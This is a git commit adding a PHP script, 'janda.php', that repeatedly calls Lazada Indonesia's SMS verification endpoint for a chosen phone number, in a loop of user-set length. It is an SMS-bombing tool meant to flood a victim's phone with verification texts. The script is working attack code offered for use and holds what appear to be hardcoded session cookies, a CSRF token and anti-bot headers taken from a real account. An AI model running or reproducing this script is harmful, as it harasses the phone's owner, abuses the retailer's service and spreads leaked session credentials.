0c4b77eb8b8b16ec7d072a5034ac7bff00d85722
agusti544 <31078984+agusti544@users.noreply.github.com>
2018-10-07 07:43:13 +0700

    Create janda.php

---
+++ janda.php
@@ -0,0 +1,47 @@
+<?php
+// Copyright: YarzC0de
+$config['headers'] = explode("\n", 'Host: member.lazada.co.id:443
+Accept: application/json, text/plain, */*
+Accept-Encoding: gzip, deflate, br
+Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
+Content-Type: application/json
+Cookie: client_type=desktop; _bl_uid=hyjaFis7xbL7ejanRg6py0vv4Iae; client_type=desktop; _vwo_uuid=8E4719FC9BB250BE90C15BD1EA2F597D; _ceir=1; 12024df8c5936919b7c8210605475950=a2b1758aac88048a93e2350e1321265ada594aa9573e0947343e2f1b73fb7690f4eb7ef802a03b62f15ac6c953a3ee382fb5eb8eb87e6e4d3cd8203ff4ef6c44%3Ade72be9a8617fa5efea5031c15ae5c1e29621f49f456f88976cedbfb28cc54a7; _ga=GA1.3.7732891.1499854924; rr_rcs=eF4Vw7ERgDAIBdAmlbt8DxIIYQPngKSwsFPn93x3r2zXe59z79bBStr4P4ygCnB58qjVKdgEMa1CeArEU9CWWqf0cB8fVkUQzw; __utmx=102046108.3NLit041QFG8cHoP66nszg$0:1.snuWP-AXQ5GJET9q_PbKXQ$0:-1; __utmxx=102046108.3NLit041QFG8cHoP66nszg$0:1506068269:8035200.snuWP-AXQ5GJET9q_PbKXQ$0:1505310553:8035200:; _vwo_uuid_v2=576DBA4CD894DC6EF6494F74D6DAFA0F|2548d6f4e8ea57606328932948b1d78e; t_fv=1514964344770; t_uid=dc63f05c-2b40-4e79-733e-471c085ffa16; cna=nnPTEofgYF0CAco+Emlqc0BJ; lzd_cid=773ca7c2-0704-4bb2-bb26-2cbacc9272a4; cto_lwid=e630119c-2fe7-442e-a343-04edb0a822d1; AMCV_126E248D54200F960A4C98C6%40AdobeOrg=-1506950487%7CMCMID%7C43635112992647523732063382845669920705%7CMCAAMLH-1520766979%7C3%7CMCAAMB-1520766979%7CRKhpRz8krg2tLO6pguXWp5olkAcUniQYPHaMWWgdJ3xzPWQmdj0y%7CMCAID%7CNONE; s_vnum=1531390925890%26vn%3D14; hng=ID|id|IDR|360; userLanguageML=id; G_ENABLED_IDPS=google; _uab_collina=153010882735812455445048; cto_axid=mHeOBJcXB7HnrkEIzpBRPTKP9aXhDPAF; __utmz=102046108.1530174185.3.2.utmcsr=google|utmgclid=Cj0KCQjwjtLZBRDLARIsAKT6fXwXdBtP-Fje3nM7lRn5hd8CwbpZFCI3ITxm9OpVp3jOxX8ViDidDzgaAvi9EALw_wcB|utmccn=[SEM-000000000000-00000-ID000-0]:%20ID|CB_Lazada|utmcmd=sem_brand|utmctr=[SEM-000000000000-00000-ID000-0]:%20ID%20CB_Lazada%20[Broad]_xxio0000000at0000_c_aud-508655650312:kwd-31300663887|utmcct=%20lazada_b; _gac_UA-29801013-1=1.1530174185.Cj0KCQjwjtLZBRDLARIsAKT6fXwXdBtP-Fje3nM7lRn5hd8CwbpZFCI3ITxm9OpVp3jOxX8ViDidDzgaAvi9EALw_wcB; _bl_uid=X0jRpibdyXLp90rb8lOUszsrph9L; t_sid=tZ5RztB5GYjLAHWEwFFZWIsGIbxLCbKv; utm_channel=NA; __utma=102046108.7732891.1499854924.1530253450.1530355013.8; __utmc=102046108; __utmt=1; cookietest=1; lzd_sid=193b1c3a4c34028dbb168b398c47ec95; _m_h5_tk=b2f8052cbb3068b0a3324eb9fca66353_1530365109478; _m_h5_tk_enc=ba3935493426118d5fe7cf0c8bd9b7c4; _tb_token_=e77d191465f3; SnapABugRef=https%3A%2F%2Fwww.lazada.co.id%2F%20; SnapABugHistory=10#; _umdata=2BA477700510A7DF877AB90F021771D8A1067C30D1BD1C3BAD6677DBF3FA29B3959F7F26B642D887CD43AD3E795C914C71084D28EAAE0B5B8B0EDF3012258516; lzd_uid=400009758753; lzd_uti=%7B%22fpd%22%3A%222018-06-28%22%2C%22lpd%22%3A%222018-06-28%22%2C%22cnt%22%3A%221%22%7D; lzd_site_id=""; __utmb=102046108.13.10.1530355013; SnapABugVisit=13#1530355016; _uetsid=_uet27cd6891; isg=BHh4jvvPV-ywirts-Xt9J7LjSSbKSffH4HxayLLogLNqzR63QvK5-bmrgd39nZRD
+Origin: https://member.lazada.co.id
+Referer: https://member.lazada.co.id/user/profile?hybrid=1&globalRegionID=ID&globalLanguage=in&globalHeadFragmentUrl=%2Fi%2Fid%2Fheader%3Fwh_site%3Did%26wh_language%3Did%26wh_version%3D2%26wh_env%3Dproduct&globalFooterFragmentUrl=%2Fi%2Fid%2Ffooter%3Fwh_site%3Did%26wh_language%3Did%26wh_version%3D2%26wh_env%3Dproduct&keyOfHtmlTitleTextInMcms=lazada.buyer.portal.keyOfHtmlTitleTextInMcms&forntConfigGlobalDataSpm=a2o4j
+User-Agent: Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Mobile Safari/537.36
+X-CSRF-TOKEN: e77d191465f3
+X-DevTools-Emulate-Network-Conditions-Client-Id: E6BB856E4779B0AC1D24DB9656C87F74
+X-Requested-With: XMLHttpRequest
+x-ua: 107#ssziqwS9sxrOmMWrPVnjXKX1lnIBgOyo/KF1rI8viFqRXKhf1VZZxrL1xDSdgH0bXK71fAaZDGf+xXGQ/eaZmzMCD+xysuI91LKqT9FmyJBsLzo8sYc0P894x9OpjIHcYB0wrq4X8otq15qHWZSvlDutfdr7yvQ7VRaeGwn+xVUPzaYa8f0T3GnbCXlFfnwiSvN8jOKMsaOiRE3FoO9Yk25kYBO0GU3DHPtxSho+NSCXXQvVbKvNQXElE9410AnE+F9QkEr4gEWX3ccI12GwQd3+qqTd3WlwI2hn7jYH29C+3xGwfdbxQ0hXa/Dorhnoh6D7BFYHKXgie1dbQxZr8dpeI3/H3UCyCgOi+Qe6Wc/eI1I2fg7fxgOydrQtZYqKwZubKfCA69iPhB03X58jbgynwC/H38Y/efQjkHX4iFei8ZwevxzvcfnjeeTEt/9EGvFSmpiKkljLC5NUF65af6j+CMn0hherrJeVgyjTg5/itB2ZQEmSwEiEuVV1G/j18EHLgTgL6yuiwZ2v01IvQJrjaalwtu+5CJD6g9VAmJQk8xke10xq3vTiqWyhFVuqrdqT7JH/ByDTtvoe10xr3feYdO/0CeMD3297sEuj5gqg37awFiAvc1+5tuiuhrVcudupy9WK7EqkuJ8FeZwa95una/hwuWV0Q0qy7jMB2XQYZBdvZxxqF2uEhCnDhCVdext6gEp56yj18BN3dBaMCvD5augECUV780yy7jMBs1Yi37cb81mUl0qgqs+3G/pUtZqy7jM6sfQYZ6IQZJxa929mpeDoqqjx32tJyfpn6yn5eZ0adkxqF2uEUuLwuWVxu5e++gHKkEQn8BSe10xr32qiqWyh3MgGZ6psmKMB2yuEC1wZd50t97tAe3Dihsr+8vHDyp+nBBQiU1ZHQE2tcB3VaeiFtu+XIJrTL9VBil/zCJZtQ7zQcBiweslUGutVGZQVBZ+KLTir8im8QBGClvVkaMHnG/QuGvevgEp56yjEhvZtUZZZDvEkaYHXrn9f86rWgEM46ylTI6aev1mCcJujteDDGW9Z86rWgEMWKTYBoxvrfmcoQmCXEC/feAYJ86+i69uABgqXefNqG68ov1VPZeDChoVKFJDsgTVBP7j+FZI8QZ09ZgQkUuVuh3KBe1VjS9iHyyuPpvIevEdtQvVPt8jUGOnyhBQWgyQvByHOX1xWZJAbe1uyUueEceuxGB3QmEpgS6eyGZNvGZ0rFJV/9/ihhInDXFXQP9+ps9tbXQCOI3PSFUEvE8KHeIABXKXFEiZvPTZzAQoWb2Oa5L0J58L4laMFXIGLzxY0KLLXz7GWbKcNQF0=
+x-umidtoken: HV01PAAZ0bfa6106727cf4cc5b375e1600328323');
+$nomer = 'Input-Number';
+$i = 0;
+$jumlah = "Input-Quantity-Or-Jumlah";
+for($i; $i<$jumlah; $i++){
+$send = json_decode(curl($nomer));
+if($send->success == true) {
+	echo("Sending to $nomer Success! <br />");
+} else {
+	echo "Sending to $nomer failure! Msg: ".$send->errorCode->displayMessage."<br />";
+}
+}
+function curl($nomer) {
+	global $config;
+	$ar = json_encode(array('phone' => $nomer,
+                                 'type' => 'CHANGE_PHONE'
+                             )
+                           );
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, "https://member.lazada.co.id/user/api/sendVerificationSms");
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($ch, CURLOPT_HEADER, false);
+	curl_setopt($ch, CURLOPT_HTTPHEADER, $config['headers']);
+	curl_setopt($ch, CURLOPT_POST, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $ar);
+	$a = curl_exec($ch);
+	curl_close($ch);
+
+	return $a;
+}
